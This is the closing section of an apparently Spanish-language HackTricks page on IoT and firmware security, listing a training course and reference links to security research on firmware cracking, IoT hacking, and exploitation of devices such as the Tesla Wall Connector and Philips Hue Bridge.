## Formación y Certificación

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Referencias

- [Cracking de firmware con Claude: habilidad de nivel senior, autonomía de nivel junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Hacking práctico de IoT: la guía definitiva para atacar el Internet de las cosas](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Explotación de zero days en hardware abandonado – blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [Cómo un dispositivo inteligente de 20 $ me dio acceso a tu hogar](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Ahora lo ves: ahora estás pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Explotación del Tesla Wall Connector desde su conector del puerto de carga - Parte 2: bypass del anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Hazlo parpadear: explotación over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
